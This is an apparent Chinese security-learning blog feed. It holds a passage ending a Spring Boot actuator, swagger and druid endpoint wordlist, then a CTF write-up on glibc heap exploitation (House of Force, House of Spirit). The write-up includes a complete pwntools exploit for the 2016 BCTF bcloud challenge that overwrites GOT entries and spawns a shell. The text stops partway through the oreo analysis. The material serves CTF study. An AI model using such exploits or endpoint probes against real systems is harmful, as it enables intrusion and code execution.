class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/%20/</span>swagger-ui.html <br>/actuator <br><span class="hljs-regexp">/actuator/</span>auditevents <br><span class="hljs-regexp">/actuator/</span>beans <br><span class="hljs-regexp">/actuator/</span>conditions <br><span class="hljs-regexp">/actuator/</span>configprops <br><span class="hljs-regexp">/actuator/</span>env <br><span class="hljs-regexp">/actuator/</span>health <br><span class="hljs-regexp">/actuator/</span>heapdump <br><span class="hljs-regexp">/actuator/</span>httptrace <br><span class="hljs-regexp">/actuator/</span>hystrix.stream <br><span class="hljs-regexp">/actuator/i</span>nfo <br><span class="hljs-regexp">/actuator/</span>jolokia <br><span class="hljs-regexp">/actuator/</span>logfile <br><span class="hljs-regexp">/actuator/</span>loggers <br><span class="hljs-regexp">/actuator/m</span>appings <br><span class="hljs-regexp">/actuator/m</span>etrics <br><span class="hljs-regexp">/actuator/</span>scheduledtasks <br><span class="hljs-regexp">/actuator/</span>swagger-ui.html <br><span class="hljs-regexp">/actuator/</span>threaddump <br><span class="hljs-regexp">/actuator/</span>trace <br>/api.html <br><span class="hljs-regexp">/api/i</span>ndex.html <br><span class="hljs-regexp">/api/</span>swagger-ui.html <br><span class="hljs-regexp">/api/</span>v2/api-docs <br>/api-docs <br>/auditevents <br>/autoconfig <br>/beans <br>/caches <br>/cloudfoundryapplication <br>/conditions <br>/configprops <br><span class="hljs-regexp">/distv2/i</span>ndex.html <br>/docs <br><span class="hljs-regexp">/druid/i</span>ndex.html <br><span class="hljs-regexp">/druid/</span>login.html <br><span class="hljs-regexp">/druid/</span>websession.html <br><span class="hljs-regexp">/dubbo-provider/</span>distv2/index.html <br>/<span class="hljs-keyword">dump</span> <br><span class="hljs-regexp">/entity/</span>all <br>/env <br><span class="hljs-regexp">/env/</span>(name) <br>/eureka <br>/flyway <br><span class="hljs-regexp">/gateway/</span>actuator <br><span class="hljs-regexp">/gateway/</span>actuator/auditevents <br><span class="hljs-regexp">/gateway/</span>actuator/beans<br><span class="hljs-regexp">/gateway/</span>actuator/conditions <br><span class="hljs-regexp">/gateway/</span>actuator/configprops <br><span class="hljs-regexp">/gateway/</span>actuator/env <br><span class="hljs-regexp">/gateway/</span>actuator/health <br><span class="hljs-regexp">/gateway/</span>actuator/heapdump <br><span class="hljs-regexp">/gateway/</span>actuator/httptrace <br><span class="hljs-regexp">/gateway/</span>actuator/hystrix.stream <br><span class="hljs-regexp">/gateway/</span>actuator/info <br><span class="hljs-regexp">/gateway/</span>actuator/jolokia <br><span class="hljs-regexp">/gateway/</span>actuator/logfile <br><span class="hljs-regexp">/gateway/</span>actuator/loggers <br><span class="hljs-regexp">/gateway/</span>actuator/mappings <br><span class="hljs-regexp">/gateway/</span>actuator/metrics <br><span class="hljs-regexp">/gateway/</span>actuator/scheduledtasks <br><span class="hljs-regexp">/gateway/</span>actuator/swagger-ui.html <br><span class="hljs-regexp">/gateway/</span>actuator/threaddump <br><span class="hljs-regexp">/gateway/</span>actuator/trace <br>/health <br>/heapdump <br>/heapdump.json <br>/httptrace <br>/hystrix <br>/hystrix.stream <br>/info <br>/intergrationgraph <br>/jolokia <br><span class="hljs-regexp">/jolokia/</span>list <br>/liquibase <br>/logfile <br>/loggers <br>/mappings <br>/metrics <br>/monitor <br>/prometheus <br>/refresh <br>/scheduledtasks <br>/sessions <br>/shutdown <br><span class="hljs-regexp">/spring-security-oauth-resource/</span>swagger-ui.html <br><span class="hljs-regexp">/spring-security-rest/</span>api/swagger-ui.html <br><span class="hljs-regexp">/static/</span>swagger.json <br><span class="hljs-regexp">/sw/</span>swagger-ui.html <br>/swagger <br><span class="hljs-regexp">/swagger/</span>codes <br><span class="hljs-regexp">/swagger/i</span>ndex.html <br><span class="hljs-regexp">/swagger/</span><span class="hljs-keyword">static</span>/index.html <br><span class="hljs-regexp">/swagger/</span>swagger-ui.html <br><span class="hljs-regexp">/swagger-dubbo/</span>api-docs <br>/swagger-ui <br>/swagger-ui.html<br><span class="hljs-regexp">/swagger-ui/</span>html <br><span class="hljs-regexp">/swagger-ui/i</span>ndex.html <br><span class="hljs-regexp">/system/</span>druid/index.html <br><span class="hljs-regexp">/template/</span>swagger-ui.html <br>/threaddump <br>/trace <br><span class="hljs-regexp">/user/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.1/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.2/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.3/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.4/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.5/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.6/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.7/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.8/</span>swagger-ui.html <br><span class="hljs-regexp">/v1.9/</span>swagger-ui.html <br><span class="hljs-regexp">/v2.0/</span>swagger-ui.html <br><span class="hljs-regexp">/v2.1/</span>swagger-ui.html <br><span class="hljs-regexp">/v2.2/</span>swagger-ui.html <br><span class="hljs-regexp">/v2.3/</span>swagger-ui.html <br><span class="hljs-regexp">/v2/</span>swagger.json <br><span class="hljs-regexp">/webpage/</span>system<span class="hljs-regexp">/druid/i</span>ndex.html <br><br></code></pre></td></tr></table></figure><h2 id="网盘信息泄漏"><a class="markdownIt-Anchor" href="#网盘信息泄漏"></a> 网盘信息泄漏</h2><p>凌风云：<a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a></p><p>蓝菊花：<a href="http://www.lanjuhua.com/">http://www.lanjuhua.com/</a></p><p>大力盘：<a href="https://www.dalipan.com/">https://www.dalipan.com/</a></p><p>猪猪盘：<a href="http://www.zhuzhupan.com/">http://www.zhuzhupan.com/</a></p><p>PanSou：<a href="http://www.pansou.com/">http://www.pansou.com/</a></p><p>盘飞飞：<a href="https://panfeifei.com/">https://panfeifei.com/</a></p>]]></content>
    
    
    <categories>
      
      <category>web学习</category>
      
      <category>学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆的House Of Force,House of spirit,Off by one 学习</title>
    <link href="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>0x00</strong>:</p><pre><code>这其实是接着上个《SploitFun Linux x86 Exploit 开发系列教程》的后续实验，书上关于堆的很多漏洞现在已经不可用或需要特定环境，所以故拿ctf题目继续学习。</code></pre><h1 id="堆的house-of-forcehouse-of-spiritoff-by-one-学习"><a class="markdownIt-Anchor" href="#堆的house-of-forcehouse-of-spiritoff-by-one-学习"></a> 堆的House Of Force,House of spirit,Off by one 学习</h1><h2 id="house-of-force"><a class="markdownIt-Anchor" href="#house-of-force"></a> House Of Force</h2><h3 id="漏洞原理"><a class="markdownIt-Anchor" href="#漏洞原理"></a> 漏洞原理</h3><p>House Of Force 是一种堆利用方法，但是并不是说 House Of Force 必须得基于堆漏洞来进行利用。如果一个堆 (heap based) 漏洞想要通过 House Of Force 方法进行利用，需要以下条件：</p><p>1.能够以溢出等方式控制到 top chunk 的 size 域</p><p>2.能够自由地控制堆分配尺寸的大小</p><p>House Of Force 产生的原因在于 glibc 对 top chunk 的处理，根据前面堆数据结构部分的知识我们得知，进行堆分配时，如果所有空闲的块都无法满足需求，那么就会从 top chunk 中分割出相应的大小作为堆块的空间。</p><p>那么，当使用 top chunk 分配堆块的 size 值是由用户控制的任意值时会发生什么？答案是，可以使得 top chunk 指向我们期望的任何位置，这就相当于一次任意地址写。然而在 glibc 中，会对用户请求的大小和 top chunk 现有的 size 进行验证</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 获取当前的top chunk，并计算其对应的大小</span><br>victim = av-&gt;top;<br>size   = chunksize(victim);<br><span class="hljs-comment">// 如果在分割之后，其大小仍然满足 chunk 的最小大小，那么就可以直接进行分割。</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)) <br>&#123;<br>    remainder_size = size - nb;<br>    remainder      = chunk_at_offset(victim, nb);<br>    av-&gt;top        = remainder;<br>    set_head(victim, nb | PREV_INUSE |<br>            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>    set_head(remainder, remainder_size | PREV_INUSE);<br><br>    check_malloced_chunk(av, victim, nb);<br>    <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>    alloc_perturb(p, bytes);<br>    <span class="hljs-keyword">return</span> p;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然而，如果可以篡改 size 为一个很大值，就可以轻松的通过这个验证，这也就是我们前面说的需要一个能够控制 top chunk size 域的漏洞。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (size) &gt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb + MINSIZE)<br></code></pre></td></tr></table></figure><p>一般的做法是把 top chunk 的 size 改为 - 1，因为在进行比较时会把 size 转换成无符号数，因此 -1 也就是说 unsigned long 中最大的数，所以无论如何都可以通过验证。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">remainder   = chunk_at_offset(victim, nb);<br>av-&gt;top    = remainder;<br><span class="hljs-comment">/* Treat space at ptr + offset as a chunk */</span><br>\<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span><br></code></pre></td></tr></table></figure><p>之后这里会把 top 指针更新，接下来的堆块就会分配到这个位置，用户只要控制了这个指针就相当于实现任意地址写任意值 (write-anything-anywhere)。</p><p><strong>与此同时，我们需要注意的是，topchunk</strong> <strong>的 size</strong> <strong>也会更新，其更新的方法如下</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">victim = av-&gt;top;<br>size  = chunksize(victim);<br>remainder_size = size - nb;<br>set_head(remainder, remainder_size | PREV_INUSE);<br></code></pre></td></tr></table></figure><p>所以，如果我们想要下次在指定位置分配大小为 x 的 chunk，我们需要确保 remainder_size 不小于 x+ MINSIZE。</p><h2 id="2016-bctf-bcloud"><a class="markdownIt-Anchor" href="#2016-bctf-bcloud"></a> 2016 BCTF bcloud</h2><h3 id="程序分析"><a class="markdownIt-Anchor" href="#程序分析"></a> 程序分析</h3><p>检查程序，程序只开启了canary和nx保护</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111002349.png" alt="image-20210802111002349" style="zoom:80%;"><p>然后用ida分析，程序刚开始会创建一个名字，这里最多读取64个字节的&amp;s，然后创建v2，这里malloc是在读取&amp;s之后的，如果我们输入了64个字节&amp;s后的/x00截断符就会被v2的地址覆盖，strcpy就会把&amp;s和v2的地址复制进去</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111059153.png" alt="image-20210802111059153" style="zoom:80%;"><p>然后下面的函数就会输出&amp;s就会把v2地址输出</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111114857.png" alt="image-20210802111114857" style="zoom:80%;"><p>还有一处漏洞在设置org和host处，这里也是和上面一样的漏洞，当输入0x40个&amp;s时，后面v2的值就会把末尾的\x00给覆盖，strcpy就会继续往下复制，而v2分配的最晚，没有堆被free，因此v2分配的堆快是与top chunk相邻的堆快，这里如果复制了0x40个数据，之后的v2的值就会覆盖top chunk的头部的pre_size，之后v3的内容就会先覆盖topchunk的size，这样我们就可以把topchunk的size覆盖成FF FF FF FF，也就是-1。</p><img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111139289.png" alt="image-20210802111139289" style="zoom:80%;"> <p>New_note函数</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111205577.png" alt="image-20210802111205577" style="zoom:80%;"><p>这里它不会检查我们输入的长度，就满足了house of force的第二个条件，我们可以自定义分配的堆大小</p><p>注意这里在创建堆快时，会把堆快的指针存放在0x804b120处，还有堆快的大小在0x804b0a0处，注意这里malloc的堆快大小是v2+4，也就是我们输入的大小+4</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111222632.png" alt="image-20210802111222632" style="zoom:80%;"><p>Show选项</p><p>这个选项什么都没输出</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111242196.png" alt="image-20210802111242196" style="zoom:80%;"><p>Edit选项</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111306828.png" alt="image-20210802111306828" style="zoom:80%;"><p>Delete选项</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111321924.png" alt="image-20210802111321924" style="zoom:80%;"><p>Syn选项，没有什么用</p><p><img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111339035.png" alt="image-20210802111339035"></p><h3 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路"></a> 利用思路</h3><ol><li><p>首先，我们要在输入name的时候输入0x40大小的的参数，然后就会泄露出name创建的内存空间的指针（第一个堆快的指针），利用这个我们可以计算top chunk的位置。</p></li><li><p>然后在输入org以及host的时候，我们先输入0x40个数据，然后v2指针的位置就会覆盖输入数据末尾的/x00截断符，然后strcpy就会继续往下复制，这里v2是后创建的堆快，所以和top chunk相邻，这时候v2的指针覆盖了top chunk的prev_size的部分，v3内容就会覆盖top chunk的size</p></li></ol> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111407277.png" alt="image-20210802111407277" style="zoom:80%;"><ol start="3"><li>我们先把top chunk的size覆盖成FF FF FF FF 这样就可以通过top chunk分配的验证，然后选择new一个chunk，大小为0x804b0a0 -8 - (泄露的第一个堆快地址- 8+ 0x48*3) - 12我们要把top chunk分配到0x804b0a0处，这样就可以控制分配的堆快大小以及位置了。</li></ol><p>计算方法：泄露的地址-8是因为还有堆头，3个0x48是name+host+org的大小，-12是因为top chunk的堆头+程序中malloc+4，-8是为了让写入的数据刚好在0x804b0a0。</p><ol start="4"><li><p>然后我们可以先把free_ got地址劫持为puts_plt的地址，然后调用delete函数泄露atoi的地址，就可以计算libc基址，得到system的地址了。</p></li><li><p>我们得先修改3个堆快的大小为足够大小，然后指针改为atoi_got，free_got，atoi_got，利用puts泄露一个atoi的地址，另外一个用来修改atoi的地址为system_addr，然后在开始调用atoi时输入/bin/sh就可以执行system（/bin/sh）拿到shell</p></li></ol><h3 id="gdb调试"><a class="markdownIt-Anchor" href="#gdb调试"></a> Gdb调试</h3><p>开始输入的0x40个a，泄露的第一块堆的地址</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111431784.png" alt="image-20210802111431784" style="zoom:80%;"><p>开始时输入name，host，org创建的三个堆块，topchunk在org的下方，也就是0xa0090d8处</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111749554.png" alt="image-20210802111749554" style="zoom:80%;"><p>通过计算偏移，第一次new调用malloc把topchunk分配到了0x804b098处</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111802382.png" alt="image-20210802111802382" style="zoom:80%;"><p>我们就可以从0x804b0a0处开始修改，先把前三个堆快大小修改为足够大（能修改got表大小即可），然后修改0x804b120处的堆指针为atoi_got，free_got，atoi_got</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111817122.png" alt="image-20210802111817122" style="zoom:80%;"><p>之后把free_got修改为puts_plt泄露的atoi地址</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111833329.png" alt="image-20210802111833329" style="zoom:80%;"><h3 id="payload"><a class="markdownIt-Anchor" href="#payload"></a> Payload</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># encoding=UTF-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./bcloud&quot;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./bcloud&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">new</span>(<span class="hljs-params">length, content</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;---&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Input the length of the note content:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(length))<br>    p.recvuntil(<span class="hljs-string">&quot;Input the content:\n&quot;</span>)<br>    p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>    p.recvuntil(<span class="hljs-string">&quot;---&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>, newcontent</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;---&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;id:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    p.recvuntil(<span class="hljs-string">&quot;new content:\n&quot;</span>)<br>    p.sendline(newcontent)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;---&gt;&gt;&quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;id:\n&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br>name = <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">0x40</span><br>org = <span class="hljs-string">&quot;b&quot;</span> * <span class="hljs-number">0x40</span><br>host = p32(<span class="hljs-number">0xffffffff</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;name:\n&quot;</span>)<br>p.send(name)<br>firstchunk = u32(p.recvuntil(<span class="hljs-string">&quot;! Welcome&quot;</span>)[-<span class="hljs-number">13</span>:-<span class="hljs-number">9</span>])<br>p.recvuntil(<span class="hljs-string">&quot;Org:\n&quot;</span>)<br>p.send(org)<br>p.recvuntil(<span class="hljs-string">&quot;Host:\n&quot;</span>)<br>p.sendline(host)<br><br>length = <span class="hljs-number">0x804b0a0</span> -<span class="hljs-number">8</span> - (firstchunk + <span class="hljs-number">0x48</span>*<span class="hljs-number">3</span> - <span class="hljs-number">8</span>) - <span class="hljs-number">12</span><br>payload=<span class="hljs-string">&#x27;&#x27;</span><br>new(length, payload)<br><br>puts = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br>atoi = elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>payload =p32(<span class="hljs-number">30</span>)+p32(<span class="hljs-number">30</span>)+p32(<span class="hljs-number">30</span>)+ <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">116</span>+p32(atoi) + p32(free) + p32(atoi)<br><span class="hljs-comment">#覆盖前3个chunk大小为30，足够修改，然后再覆盖0x804b120处的堆指针</span><br>length = <span class="hljs-built_in">len</span>(payload)<br>new(length, payload)<br><span class="hljs-comment">#p.interactive()</span><br>edit(<span class="hljs-number">1</span>, p32(puts))<br>delete(<span class="hljs-number">0</span>)<br><br>atoi_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>libc_base = atoi_addr - libc.symbols[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;id:\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;new content:\n&quot;</span>)<br>p.sendline(p32(system_addr))<br>p.recvuntil(<span class="hljs-string">&quot;---&gt;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br>p.interactive()<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Input the length of the note content:\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(length))<br>p.interactive()<br><br><br></code></pre></td></tr></table></figure><h2 id="house-of-spirit"><a class="markdownIt-Anchor" href="#house-of-spirit"></a> House of Spirit</h2><h2 id="漏洞原理-2"><a class="markdownIt-Anchor" href="#漏洞原理-2"></a> 漏洞原理</h2><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><p>·    fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</p><p>·    fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</p><p>·    fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</p><p>·    fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。</p><p>·    fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</p><h2 id="2014-hacklu-oreo"><a class="markdownIt-Anchor" href="#2014-hacklu-oreo"></a> 2014 <a href="http://hack.lu">hack.lu</a> oreo</h2><h3 id="程序分析-2"><a class="markdownIt-Anchor" href="#程序分析-2"></a> 程序分析</h3> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111929070.png" alt="image-20210802111929070" style="zoom:80%;"><p>这个程序只开启了nx和canary保护</p><p>然后拖入ida进行分析</p><p>程序有5个功能</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802111947858.png" alt="image-20210802111947858" style="zoom:80%;"><p>添加功能</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112002731.png" alt="image-20210802112002731" style="zoom:80%;"><p>这里可以看出来这个分配内存的大致结构了</p><p>0 description</p><p>0x19 name</p><p>0x34 前一个内存的地址</p><p>0x38</p><p><em>((_DWORD <em>)chunk_addr_dword_804A288 + 13) = v1;，这里是把v1=之前的chunk_addr_dword_804A288（这个地方记录上次分配的内存的地址）处的地址+13</em>4（0x34）的地方赋值成了当前分配的内存的地址，这里DWORD是4字节，所以是chunk_addr_dword_804A288+13</em>4的位置</p><p>然后这里读取name的时候存在溢出，这里可以读入56个字节，但是从chunk_addr_dword_804A288+25到+0x38只有31个字节，可以通过溢出覆盖到前一个内存的地址</p><p>还有一点是这里每创建一个堆快就会把dword_804A2A4的值加1</p><p>show展示功能</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112530269.png" alt="image-20210802112530269" style="zoom:80%;"><p>从最后一个创建的堆开始，根据堆中的前项指针*((_DWORD *)chunk_addr_dword_804A288 + 13)，依次显示之前创建的堆块。</p><p>Order（删除）功能</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112600837.png" alt="image-20210802112600837" style="zoom:80%;"><p>依次free掉创建的堆快</p><p>Leave功能</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112617926.png" alt="image-20210802112617926" style="zoom:80%;"><p>这里是往804A2A8的地方写入输入的内容，最大128字节，而0x804a2a8这个地方一开始是0x0804a2c0，也就是往0x0804a2c0写入输入的内容</p> <img src="/2021/05/27/%E5%A0%86%E7%9A%84House-Of-Force-House-of-spirit-Off-by-one-%E5%AD%A6%E4%B9%A0/image-20210802112643127.png" alt="image-20210802112643127" style="zoom:80%;"><h3 id="利用思路-2"><a class="markdownIt-Anchor" href="#利用思路-2"></a> 利用思路</h3><ol><li><p>首先我们得泄露出libc的基地址，用来计算system的地址，思路是利用输入name的溢出，把堆的前项指针改成printf函数的got表地址，然后通过show选项，打印出printf的真实地址用来计算libc的基址。</p></li><li><p>之后利用House of Spirit，伪造一个fastbin，然后free后把我们可以分配的内存改到0x804A2A8，因为这个地方存放的是leave功能写入的地址，如果我们能控制这个地方，然后改成我们想要修改的函数的got表地址就可以进行利用</p></li><li><p>伪造fastbin的方法：</p></li></ol><p>首先每创建一个堆快就会把dword_804A2A4的值加1，而这个位置相当于我们在0x804A2A0伪造的chunk的size值，因为我们创建的chunk是0x40大小的，所以我们得先创建0x40个chunk把这里的值改成0x40，因为这里我们伪造的chunk的size位是0x804A2A4。注意这里创建的chunk的每个前项指针得设置成NULL，这样在free的时候就不会把依次free所有的chunk了。</p><p>然后还需要绕过一个检查：</p><p>·    fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 